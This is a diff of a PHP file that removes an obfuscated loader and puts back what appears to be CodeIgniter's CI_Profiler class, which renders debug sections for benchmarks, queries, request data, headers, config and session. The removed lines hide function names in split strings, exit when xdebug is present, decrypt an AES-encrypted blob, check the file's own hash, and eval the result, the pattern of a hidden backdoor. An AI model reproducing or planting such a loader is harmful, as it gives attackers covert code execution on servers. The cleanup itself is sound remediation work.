@@ -1,28 +1,495 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_ja2ul4nj=('bas'.'e64'.'_de'.'cod'.'e');
-$_uohbrn12=('gzu'.'nco'.'mpr'.'ess');
-$_cl5j6012=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_iv8uy3g2='5nZcMsZpc3M=';
-$_cicu53yr='iHnaBQ0U';
-$_if85nw3b='4kr7snrB';
-$_fmtj6lh0='2YES/cK3';
-$_dz8mtz1n='s35atfCb';
-$_nuq39mha='+R1p7A==';
-$_ocegg8vj='vaI1aQEQ';
-$_qwjnox56='VzXqmUBq';
-$_hb5xuf6w=$_ja2ul4nj($_cicu53yr.$_dz8mtz1n.$_if85nw3b.$_fmtj6lh0.$_iv8uy3g2);
-$_d4k0q427=$_ja2ul4nj($_ocegg8vj.$_qwjnox56.$_nuq39mha);
-$_amlekh7q=$_ja2ul4nj('LRbEQ/b3DnEd0x3nnjzGZgdsVGppN8P8CG4/VqAMgprWLM3qMUIdNyeLbCjMO5ZGUnS24w+r3RYShG61tQAOXT0gmGjICPEoKnHLKNN2++ZDJ6uTrAfpTlWg1Jl1vH18RV3dVUUN6Pt5x7Q+aMVQ4EXl+38Ftw3HcFHJL6lKbAR/UIUikOQOQpp7i2ibfh2oKVreeH1gopzgNVLMAN1glN0TKQljt/XKNpUhDPIDE9mnv7n2543vaqClM/vRFt/XphZh5VP0r68j7gHbtgRWxGiKk2f7MucEftdY6j1CmlQL0MaGdMI4kwoL22zHv8SwSYTpUDLiMeJWD/9odk3Td+VezeaxtADligobqZ3ptEn3gDpP9KYTJHJxTCyGHgu02gGAySUDZsKzlE4odAh6lhncH6ugcRaeEjnh3HbqJV7RhBP2XEZflHIbcWAR+189frNYyFTzz/MYYS434I+Os7I/Oq6RnIObqaP/j8MUFukmsyzy8E9C8YzuBDTV64JL3s9y5itZRfmwY8ZPUy9MmfXwOeJl/qesD+dcB6MY7U2MCvOWItDiZvVRxM/ziKxENez1HZVne2TBKDN9S3EM+4DSFCwlxlgDc6XCQo8YTgFiYzS6CDaNlcG+XZQ754CRUIb9j7ujtNrYDfGKR4RkxtBTsfv3tS+HabAaDwUMhjF0wWVWavQD3Bekoog8i1r1QoattqyeJtLij1n80U3kPGtsTJFajA7Elfmz8GORlEe3Kh2iRbrKwwIc7tZm77T8dTemgnfjIEXNDkIGm93pAt29Tv8cMJGFBjm/QrY6dMrsIA6I/J3hVv7dSYG/rjZsqoDxUcq+PMGPo5fXpO4mEkUrhlZFvts4Av7R/HD5/QTQUwv9s5VWqSJUQP6pTZsTpz92S1Fqb70kFnd3iWGzK4H9SIlIKYmMCQ1DhyJS9eGTWhtrfaQz8qSLI2uCfqiq/0aR7CP8uitrwt7Cs4NU3Q6KxB4pWWOOxFBUW7QPvjXZSDoJVfE8YzmmLg6nXspWLf8EJ9XpLWoInrIfvrCXW+5piGP1k1y0+uaXyCrNSvN3c5H/MmlRKIKvmmkvMgGXKGANeOuUji5oLoWrn1HUq4Us6+gqz219HJpNdvsBIyDu5wXdwRiAbuK+Ed+SyftbioxgqztHQ0IlOHz0kaOaJZqWYKfTESAx/uKvP/otUlMs2tJquT9RKM2MFYsIzkmO1+Ubb8L6OLI7rQnv6/qhu+I4CNnuyN8cg8HYhhP3CeKXCr8rZKnnIdpPbndJMaweMhUOy8LzR/mIK0t2ULndkSy5O0Y6LSSnJuxavdIXbsRoVEHbv3fOdy+vrx7EShHy6QOi6b9TmJXSGjg4YtCaykrZ8xSo+x5XJn9X+yvV9Et49QJz7tClAaSL2Lp/hCGt40RB6P+ARjeaNDlMHCTWnwGqOzREBa9pC2M9jDWac5RvVPy4P0QeGzxBiR4MYSVgJMJBxkvmHb3JeJuJnZD6341AQuhWI7lcGAkNVkr9rHAO+UTzkakk1n6JrTKFiSD7OwpYcTjPWkj0XoE778sG1WKOzhxM6YZB0Xqp7NFITFta6Ls3PncCjl3MvyHwLXcveQ562ZspB6jUJWkkgM4ilc7e7EUmh4EpJBBAQsoisatQ2kBvqH2QW4p2lTHxUMoLcf5Wbi9snkovZegAoyjNFp0aZZljkWW2xq/arK4qnUbS5FjkZOCzEV5dyvyemcyqbLiL9gxxn3YWpoJfWQd7PJs6Nq4wl3zikCP2NVdqco73QFPtl9DgnxjMWijoiVGlFxaS/kg6sBo5nCAxzt5IAvOsmE1QZvaeTEzpFYuDWbuKu9f6A4sqjY93hPHbepXpsDxmdKtN9fdwRQw3bLLZJYpeEt/eoIPAVbVu9il4gquxDFzQ2d2VdLFucjwzGHU0nremJ69Vw2bB9XCHavsH8l2YHBa0ipM9H5Uecl6s/igjFJNW4bNzzO7vN2QxgYKDfdEntX6rFCfRlZS2ps47dxgfevmDWF2V+MFt6qPtCvM4BQlFBTvQRyz8qNuyuZBjybeUef+3K4CVV85/KohxWPjLDhyPHz6h2T8sEOC8h9is3FvixXM09TWMl8qupmrhNf8q+xU80ute0ulwmTqwZy1mWLIZ353ggQ0DtmOHkLhCffgF5/XCpLk2Ss7AxTzl3G0n9ydD10eQcaGIc2D4DAR25G5aPs/zKSc/kNCuvIhHYJb0AIGxf31Kimbm63/WcTQK4xDOR7JtFWW7VsYJWtc+rnjDQ+lCH6KaVWAh+XwY/8KstQC7IW6cTkj/dMYqQt0NrxMYw8VVUHbHdQ4JyS5nXMVVM74UBn6IANjYTv4X8Mey6/Ti2vkQIkLOeZNrimzygw9dgFTY5zMj+KLU/oclEtEzh4Z4WEjE7NvfTlMBusm9xa3Ha267ZD1y5bigOE/ntt5mhtnfyKliJpjc2MImIlxmCBzZElHfxiCxLhUL1NtRM4tthXxYppPTXROmJ+D+7WbZzUXjpJzhyoE1Mm9smQdR4z5OfFRI8Ry+HRP1FarVnYG8I74KND74muRuuycLH5jn6hNLfVnWEo0vq6S/YrK8Z0etNV01JztjUBCjqDDeM+PW7bu+JhElIEkM50Ir5ASFSgyS1PpOJAQTdiDxyQTlzmVYUCEfL0ZH90L9inINxoTb9AmXLq5FP7hL5aar9b/CEBTyTHBmqdOGM88DvQm09ZaubepBjjp9z3EO9FhiLNpUTQzDtq76Noc++eNzwTX2y30NmRiA6fPS2qRBMxec2UY3M/ebDJOu46/D9kbND9AlspUBDtjiD83jsbu3AY1uH+L0flKokEQALtdrHZsV7jgnR48RN/u9/3fCPRXS1Trzeywgc2euu5H/9EkHVA+zaCaVZZ8s+1HUjtlh78nG/xPD/hlOoPsmDy2Pc2a6JZBwSBZzx5kMnTD3+Pti1y6gR5kcZvsqeuC4QQgp1XrEWOhYM+qqm1dP96elUU87tv2XXZYwvH1QTUfCO7SwlN5FFJ30+rOcctW+WWaA1Xg9wcKmMUwAMzGP3GnJsc7VYYdEGAXoNshlYw98xfe4ZSsxvWXa6N9i73MyPD/giEkNYTvEZ/TKQp5IIeakNU8iO2uUtW13eG450M4EBzhiINJHf69YkFAC9l/TYvhSM+VikIzK68IHypzu1naphitbIEyv2e5t/lOh8T/bun6Bu/rSgO6IRSJEr6KFG2oXdsnYRLnXhlusG1gEBJkUQMBZObcgqdFek1grqpkZrHncoaG6Bn4ShioadIS4szuWWg2TI/kOpElVAyYvYbuA0ZXeIn7RJEqESIfRRpGyUMJ7h4YTNSI6Hs4f0w6DbWgFay6C9qlHhzjYG+V/DFSM1iaWTY1FW4SNqOqd2RzEPRtIIjJiDMUXDakGotBBUMH4ei9X0tg6ejCbJ6qv0m8YdfNn3V/T1+ihj+zVpfGE24C0KXpHpo3LJOuBuxZrWeJ5NnZdxBhiIesE288rrz9mIszZiriR+K/YEqWApq8CWM1gTNRTQ+MSxT/adpV7YRSyplYuJI4upiJQqfzF3TtpadwLPNFOfIWDC6YKrCl9NEHJYXEv0AeM7nkrcNBMKpUGcJwTAwoLTsNSv9JquNfP0x5JdxKLqR4cC8n7sotr/ONQxK/Okucxwtq8wdCAR1LadCQhh/5bL6Dw8FgnQDKufNoCFJn8mRZQEIJ/D27JSEk/+yHluArW7dQInUmFgDxA9jgtXF/w15XfgYKad9zEKI+OPDArOuTlABSvvzv2QWUuYU/zqIPs/aZ1OwXaIYN+2pQeO3awPI9DI5lIZDO1Ob4aYMtx+J4K5496Acc/5HzxkpR2fBYCc8D0GcmBmK1uvHH/jLPgQyk9kejUrtsEAE3RmBorheK8OXav1jKUjjrHL7OPg44TE+/VK1JNVYhkfy7IO1ECaPXKRZA2AMU=');
-$_enz4skew=$_cl5j6012($_amlekh7q,'aes-256-cbc',$_hb5xuf6w,OPENSSL_RAW_DATA,$_d4k0q427);
-if($_enz4skew===false){exit;}
-$_yjrojej9=$_uohbrn12($_enz4skew);
-if($_yjrojej9===false){exit;}
-$_nfy0k7fg='3a13c5416ac32403781db7fde61450a83f1949819656eb086656339f1232b394';
-$_h9vzhox0=@file_get_contents(__FILE__);
-if($_h9vzhox0!==false){
-$_zt0iks4s=str_replace($_nfy0k7fg,"0000000000000000000000000000000000000000000000000000000000000000",$_h9vzhox0);
-$_rdgncffr=hash("sha256",$_zt0iks4s);
-if($_rdgncffr!==$_nfy0k7fg){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+class CI_Profiler {
+
+
+
+
+
+protected $_available_sections = array(
+'benchmarks',
+'get',
+'memory_usage',
+'post',
+'uri_string',
+'controller_info',
+'queries',
+'http_headers',
+'session_data',
+'config'
+);
+
+
+
+
+
+protected $_query_toggle_count = 25;
+
+
+
+
+
+protected $CI;
+
+
+
+
+
+
+
+
+public function __construct($config = array())
+{
+$this->CI =& get_instance();
+$this->CI->load->language('profiler');
+
+foreach ($this->_available_sections as $section)
+{
+if ( ! isset($config[$section]))
+{
+$this->{"_compile_{$section}"} = TRUE;
 }
-eval($_yjrojej9);
+}
+$this->set_sections($config);
+log_message('info', 'Profiler Class Initialized');
+}
+
+
+
+
+
+
+
+
+
+public function set_sections($config)
+{
+if (isset($config['query_toggle_count']))
+{
+$this->_query_toggle_count = (int) $config['query_toggle_count'];
+unset($config['query_toggle_count']);
+}
+foreach ($config as $method => $enable)
+{
+if (in_array($method, $this->_available_sections))
+{
+$this->{"_compile_{$method}"} = ($enable !== FALSE);
+}
+}
+}
+
+
+
+
+
+
+
+
+
+
+
+protected function _compile_benchmarks()
+{
+$profile = array();
+foreach ($this->CI->benchmark->marker as $key => $val)
+{
+
+
+if (preg_match('/(.+?)_end$/i', $key, $match)
+&& isset($this->CI->benchmark->marker[$match[1].'_end'], $this->CI->benchmark->marker[$match[1].'_start']))
+{
+$profile[$match[1]] = $this->CI->benchmark->elapsed_time($match[1].'_start', $key);
+}
+}
+
+
+
+$output = "\n\n"
+.'<fieldset id="ci_profiler_benchmarks" style="border:1px solid #900;padding:6px 10px 10px 10px;margin:20px 0 20px 0;background-color:#eee;">'
+."\n"
+.'<legend style="color:#900;">&nbsp;&nbsp;'.$this->CI->lang->line('profiler_benchmarks')."&nbsp;&nbsp;</legend>"
+."\n\n\n<table style=\"width:100%;\">\n";
+foreach ($profile as $key => $val)
+{
+$key = ucwords(str_replace(array('_', '-'), ' ', $key));
+$output .= '<tr><td style="padding:5px;width:50%;color:#000;font-weight:bold;background-color:#ddd;">'
+.$key.'&nbsp;&nbsp;</td><td style="padding:5px;width:50%;color:#900;font-weight:normal;background-color:#ddd;">'
+.$val."</td></tr>\n";
+}
+return $output."</table>\n</fieldset>";
+}
+
+
+
+
+
+
+protected function _compile_queries()
+{
+$dbs = array();
+
+foreach (get_object_vars($this->CI) as $name => $cobject)
+{
+if (is_object($cobject))
+{
+if ($cobject instanceof CI_DB)
+{
+$dbs[get_class($this->CI).':$'.$name] = $cobject;
+}
+elseif ($cobject instanceof CI_Model)
+{
+foreach (get_object_vars($cobject) as $mname => $mobject)
+{
+if ($mobject instanceof CI_DB)
+{
+$dbs[get_class($cobject).':$'.$mname] = $mobject;
+}
+}
+}
+}
+}
+if (count($dbs) === 0)
+{
+return "\n\n"
+.'<fieldset id="ci_profiler_queries" style="border:1px solid #0000FF;padding:6px 10px 10px 10px;margin:20px 0 20px 0;background-color:#eee;">'
+."\n"
+.'<legend style="color:#0000FF;">&nbsp;&nbsp;'.$this->CI->lang->line('profiler_queries').'&nbsp;&nbsp;</legend>'
+."\n\n\n<table style=\"border:none; width:100%;\">\n"
+.'<tr><td style="width:100%;color:#0000FF;font-weight:normal;background-color:#eee;padding:5px;">'
+.$this->CI->lang->line('profiler_no_db')
+."</td></tr>\n</table>\n</fieldset>";
+}
+
+$this->CI->load->helper('text');
+
+$highlight = array('SELECT', 'DISTINCT', 'FROM', 'WHERE', 'AND', 'LEFT&nbsp;JOIN', 'ORDER&nbsp;BY', 'GROUP&nbsp;BY', 'LIMIT', 'INSERT', 'INTO', 'VALUES', 'UPDATE', 'OR&nbsp;', 'HAVING', 'OFFSET', 'NOT&nbsp;IN', 'IN', 'LIKE', 'NOT&nbsp;LIKE', 'COUNT', 'MAX', 'MIN', 'ON', 'AS', 'AVG', 'SUM', '(', ')');
+$output = "\n\n";
+$count = 0;
+foreach ($dbs as $name => $db)
+{
+$hide_queries = (count($db->queries) > $this->_query_toggle_count) ? ' display:none' : '';
+$total_time = number_format(array_sum($db->query_times), 4).' '.$this->CI->lang->line('profiler_seconds');
+$show_hide_js = '(<span style="cursor: pointer;" onclick="var s=document.getElementById(\'ci_profiler_queries_db_'.$count.'\').style;s.display=s.display==\'none\'?\'\':\'none\';this.innerHTML=this.innerHTML==\''.$this->CI->lang->line('profiler_section_hide').'\'?\''.$this->CI->lang->line('profiler_section_show').'\':\''.$this->CI->lang->line('profiler_section_hide').'\';">'.$this->CI->lang->line('profiler_section_hide').'</span>)';
+if ($hide_queries !== '')
+{
+$show_hide_js = '(<span style="cursor: pointer;" onclick="var s=document.getElementById(\'ci_profiler_queries_db_'.$count.'\').style;s.display=s.display==\'none\'?\'\':\'none\';this.innerHTML=this.innerHTML==\''.$this->CI->lang->line('profiler_section_show').'\'?\''.$this->CI->lang->line('profiler_section_hide').'\':\''.$this->CI->lang->line('profiler_section_show').'\';">'.$this->CI->lang->line('profiler_section_show').'</span>)';
+}
+$output .= '<fieldset style="border:1px solid #0000FF;padding:6px 10px 10px 10px;margin:20px 0 20px 0;background-color:#eee;">'
+."\n"
+.'<legend style="color:#0000FF;">&nbsp;&nbsp;'.$this->CI->lang->line('profiler_database')
+.':&nbsp; '.$db->database.' ('.$name.')&nbsp;&nbsp;&nbsp;'.$this->CI->lang->line('profiler_queries')
+.': '.count($db->queries).' ('.$total_time.')&nbsp;&nbsp;'.$show_hide_js."</legend>\n\n\n"
+.'<table style="width:100%;'.$hide_queries.'" id="ci_profiler_queries_db_'.$count."\">\n";
+if (count($db->queries) === 0)
+{
+$output .= '<tr><td style="width:100%;color:#0000FF;font-weight:normal;background-color:#eee;padding:5px;">'
+.$this->CI->lang->line('profiler_no_queries')."</td></tr>\n";
+}
+else
+{
+foreach ($db->queries as $key => $val)
+{
+$time = number_format($db->query_times[$key], 4);
+$val = highlight_code($val);
+foreach ($highlight as $bold)
+{
+$val = str_replace($bold, '<strong>'.$bold.'</strong>', $val);
+}
+$output .= '<tr><td style="padding:5px;vertical-align:top;width:1%;color:#900;font-weight:normal;background-color:#ddd;">'
+.$time.'&nbsp;&nbsp;</td><td style="padding:5px;color:#000;font-weight:normal;background-color:#ddd;">'
+.$val."</td></tr>\n";
+}
+}
+$output .= "</table>\n</fieldset>";
+$count++;
+}
+return $output;
+}
+
+
+
+
+
+
+protected function _compile_get()
+{
+$output = "\n\n"
+.'<fieldset id="ci_profiler_get" style="border:1px solid #cd6e00;padding:6px 10px 10px 10px;margin:20px 0 20px 0;background-color:#eee;">'
+."\n"
+.'<legend style="color:#cd6e00;">&nbsp;&nbsp;'.$this->CI->lang->line('profiler_get_data')."&nbsp;&nbsp;</legend>\n";
+if (count($_GET) === 0)
+{
+$output .= '<div style="color:#cd6e00;font-weight:normal;padding:4px 0 4px 0;">'.$this->CI->lang->line('profiler_no_get').'</div>';
+}
+else
+{
+$output .= "\n\n<table style=\"width:100%;border:none;\">\n";
+foreach ($_GET as $key => $val)
+{
+is_int($key) OR $key = "'".htmlspecialchars($key, ENT_QUOTES, config_item('charset'))."'";
+$val = (is_array($val) OR is_object($val))
+? '<pre>'.htmlspecialchars(print_r($val, TRUE), ENT_QUOTES, config_item('charset')).'</pre>'
+: htmlspecialchars($val, ENT_QUOTES, config_item('charset'));
+$output .= '<tr><td style="width:50%;color:#000;background-color:#ddd;padding:5px;">&#36;_GET['
+.$key.']&nbsp;&nbsp; </td><td style="width:50%;padding:5px;color:#cd6e00;font-weight:normal;background-color:#ddd;">'
+.$val."</td></tr>\n";
+}
+$output .= "</table>\n";
+}
+return $output.'</fieldset>';
+}
+
+
+
+
+
+
+protected function _compile_post()
+{
+$output = "\n\n"
+.'<fieldset id="ci_profiler_post" style="border:1px solid #009900;padding:6px 10px 10px 10px;margin:20px 0 20px 0;background-color:#eee;">'
+."\n"
+.'<legend style="color:#009900;">&nbsp;&nbsp;'.$this->CI->lang->line('profiler_post_data')."&nbsp;&nbsp;</legend>\n";
+if (count($_POST) === 0 && count($_FILES) === 0)
+{
+$output .= '<div style="color:#009900;font-weight:normal;padding:4px 0 4px 0;">'.$this->CI->lang->line('profiler_no_post').'</div>';
+}
+else
+{
+$output .= "\n\n<table style=\"width:100%;\">\n";
+foreach ($_POST as $key => $val)
+{
+is_int($key) OR $key = "'".htmlspecialchars($key, ENT_QUOTES, config_item('charset'))."'";
+$val = (is_array($val) OR is_object($val))
+? '<pre>'.htmlspecialchars(print_r($val, TRUE), ENT_QUOTES, config_item('charset')).'</pre>'
+: htmlspecialchars($val, ENT_QUOTES, config_item('charset'));
+$output .= '<tr><td style="width:50%;padding:5px;color:#000;background-color:#ddd;">&#36;_POST['
+.$key.']&nbsp;&nbsp; </td><td style="width:50%;padding:5px;color:#009900;font-weight:normal;background-color:#ddd;">'
+.$val."</td></tr>\n";
+}
+foreach ($_FILES as $key => $val)
+{
+is_int($key) OR $key = "'".htmlspecialchars($key, ENT_QUOTES, config_item('charset'))."'";
+$val = (is_array($val) OR is_object($val))
+? '<pre>'.htmlspecialchars(print_r($val, TRUE), ENT_QUOTES, config_item('charset')).'</pre>'
+: htmlspecialchars($val, ENT_QUOTES, config_item('charset'));
+$output .= '<tr><td style="width:50%;padding:5px;color:#000;background-color:#ddd;">&#36;_FILES['
+.$key.']&nbsp;&nbsp; </td><td style="width:50%;padding:5px;color:#009900;font-weight:normal;background-color:#ddd;">'
+.$val."</td></tr>\n";
+}
+$output .= "</table>\n";
+}
+return $output.'</fieldset>';
+}
+
+
+
+
+
+
+protected function _compile_uri_string()
+{
+return "\n\n"
+.'<fieldset id="ci_profiler_uri_string" style="border:1px solid #000;padding:6px 10px 10px 10px;margin:20px 0 20px 0;background-color:#eee;">'
+."\n"
+.'<legend style="color:#000;">&nbsp;&nbsp;'.$this->CI->lang->line('profiler_uri_string')."&nbsp;&nbsp;</legend>\n"
+.'<div style="color:#000;font-weight:normal;padding:4px 0 4px 0;">'
+.($this->CI->uri->uri_string === '' ? $this->CI->lang->line('profiler_no_uri') : $this->CI->uri->uri_string)
+.'</div></fieldset>';
+}
+
+
+
+
+
+
+protected function _compile_controller_info()
+{
+return "\n\n"
+.'<fieldset id="ci_profiler_controller_info" style="border:1px solid #995300;padding:6px 10px 10px 10px;margin:20px 0 20px 0;background-color:#eee;">'
+."\n"
+.'<legend style="color:#995300;">&nbsp;&nbsp;'.$this->CI->lang->line('profiler_controller_info')."&nbsp;&nbsp;</legend>\n"
+.'<div style="color:#995300;font-weight:normal;padding:4px 0 4px 0;">'.$this->CI->router->class.'/'.$this->CI->router->method
+.'</div></fieldset>';
+}
+
+
+
+
+
+
+
+
+protected function _compile_memory_usage()
+{
+return "\n\n"
+.'<fieldset id="ci_profiler_memory_usage" style="border:1px solid #5a0099;padding:6px 10px 10px 10px;margin:20px 0 20px 0;background-color:#eee;">'
+."\n"
+.'<legend style="color:#5a0099;">&nbsp;&nbsp;'.$this->CI->lang->line('profiler_memory_usage')."&nbsp;&nbsp;</legend>\n"
+.'<div style="color:#5a0099;font-weight:normal;padding:4px 0 4px 0;">'
+.(($usage = memory_get_usage()) != '' ? number_format($usage).' bytes' : $this->CI->lang->line('profiler_no_memory'))
+.'</div></fieldset>';
+}
+
+
+
+
+
+
+
+
+protected function _compile_http_headers()
+{
+$output = "\n\n"
+.'<fieldset id="ci_profiler_http_headers" style="border:1px solid #000;padding:6px 10px 10px 10px;margin:20px 0 20px 0;background-color:#eee;">'
+."\n"
+.'<legend style="color:#000;">&nbsp;&nbsp;'.$this->CI->lang->line('profiler_headers')
+.'&nbsp;&nbsp;(<span style="cursor: pointer;" onclick="var s=document.getElementById(\'ci_profiler_httpheaders_table\').style;s.display=s.display==\'none\'?\'\':\'none\';this.innerHTML=this.innerHTML==\''.$this->CI->lang->line('profiler_section_show').'\'?\''.$this->CI->lang->line('profiler_section_hide').'\':\''.$this->CI->lang->line('profiler_section_show').'\';">'.$this->CI->lang->line('profiler_section_show')."</span>)</legend>\n\n\n"
+.'<table style="width:100%;display:none;" id="ci_profiler_httpheaders_table">'."\n";
+foreach (array('HTTP_ACCEPT', 'HTTP_USER_AGENT', 'HTTP_CONNECTION', 'SERVER_PORT', 'SERVER_NAME', 'REMOTE_ADDR', 'SERVER_SOFTWARE', 'HTTP_ACCEPT_LANGUAGE', 'SCRIPT_NAME', 'REQUEST_METHOD',' HTTP_HOST', 'REMOTE_HOST', 'CONTENT_TYPE', 'SERVER_PROTOCOL', 'QUERY_STRING', 'HTTP_ACCEPT_ENCODING', 'HTTP_X_FORWARDED_FOR', 'HTTP_DNT') as $header)
+{
+$val = isset($_SERVER[$header]) ? htmlspecialchars($_SERVER[$header], ENT_QUOTES, config_item('charset')) : '';
+$output .= '<tr><td style="vertical-align:top;width:50%;padding:5px;color:#900;background-color:#ddd;">'
+.$header.'&nbsp;&nbsp;</td><td style="width:50%;padding:5px;color:#000;background-color:#ddd;">'.$val."</td></tr>\n";
+}
+return $output."</table>\n</fieldset>";
+}
+
+
+
+
+
+
+
+
+protected function _compile_config()
+{
+$output = "\n\n"
+.'<fieldset id="ci_profiler_config" style="border:1px solid #000;padding:6px 10px 10px 10px;margin:20px 0 20px 0;background-color:#eee;">'
+."\n"
+.'<legend style="color:#000;">&nbsp;&nbsp;'.$this->CI->lang->line('profiler_config').'&nbsp;&nbsp;(<span style="cursor: pointer;" onclick="var s=document.getElementById(\'ci_profiler_config_table\').style;s.display=s.display==\'none\'?\'\':\'none\';this.innerHTML=this.innerHTML==\''.$this->CI->lang->line('profiler_section_show').'\'?\''.$this->CI->lang->line('profiler_section_hide').'\':\''.$this->CI->lang->line('profiler_section_show').'\';">'.$this->CI->lang->line('profiler_section_show')."</span>)</legend>\n\n\n"
+.'<table style="width:100%;display:none;" id="ci_profiler_config_table">'."\n";
+foreach ($this->CI->config->config as $config => $val)
+{
+$pre = '';
+$pre_close = '';
+if (is_array($val) OR is_object($val))
+{
+$val = print_r($val, TRUE);
+$pre = '<pre>' ;
+$pre_close = '</pre>';
+}
+$output .= '<tr><td style="padding:5px;vertical-align:top;color:#900;background-color:#ddd;">'
+.$config.'&nbsp;&nbsp;</td><td style="padding:5px;color:#000;background-color:#ddd;">'.$pre.htmlspecialchars($val, ENT_QUOTES, config_item('charset')).$pre_close."</td></tr>\n";
+}
+return $output."</table>\n</fieldset>";
+}
+
+
+
+
+
+
+protected function _compile_session_data()
+{
+if ( ! isset($this->CI->session))
+{
+return;
+}
+$output = '<fieldset id="ci_profiler_csession" style="border:1px solid #000;padding:6px 10px 10px 10px;margin:20px 0 20px 0;background-color:#eee;">'
+.'<legend style="color:#000;">&nbsp;&nbsp;'.$this->CI->lang->line('profiler_session_data').'&nbsp;&nbsp;(<span style="cursor: pointer;" onclick="var s=document.getElementById(\'ci_profiler_session_data\').style;s.display=s.display==\'none\'?\'\':\'none\';this.innerHTML=this.innerHTML==\''.$this->CI->lang->line('profiler_section_show').'\'?\''.$this->CI->lang->line('profiler_section_hide').'\':\''.$this->CI->lang->line('profiler_section_show').'\';">'.$this->CI->lang->line('profiler_section_show').'</span>)</legend>'
+.'<table style="width:100%;display:none;" id="ci_profiler_session_data">';
+foreach ($this->CI->session->userdata() as $key => $val)
+{
+$pre = '';
+$pre_close = '';
+if (is_array($val) OR is_object($val))
+{
+$val = print_r($val, TRUE);
+$pre = '<pre>' ;
+$pre_close = '</pre>';
+}
+$output .= '<tr><td style="padding:5px;vertical-align:top;color:#900;background-color:#ddd;">'
+.$key.'&nbsp;&nbsp;</td><td style="padding:5px;color:#000;background-color:#ddd;">'.$pre.htmlspecialchars($val, ENT_QUOTES, config_item('charset')).$pre_close."</td></tr>\n";
+}
+return $output."</table>\n</fieldset>";
+}
+
+
+
+
+
+
+public function run()
+{
+$output = '<div id="codeigniter_profiler" style="clear:both;background-color:#fff;padding:10px;">';
+$fields_displayed = 0;
+foreach ($this->_available_sections as $section)
+{
+if ($this->{"_compile_{$section}"} !== FALSE)
+{
+$func = '_compile_'.$section;
+$output .= $this->{$func}();
+$fields_displayed++;
+}
+}
+if ($fields_displayed === 0)
+{
+$output .= '<p style="border:1px solid #5a0099;padding:10px;margin:20px 0;background-color:#eee;">'
+.$this->CI->lang->line('profiler_no_profiles').'</p>';
+}
+return $output.'</div>';
+}
+}
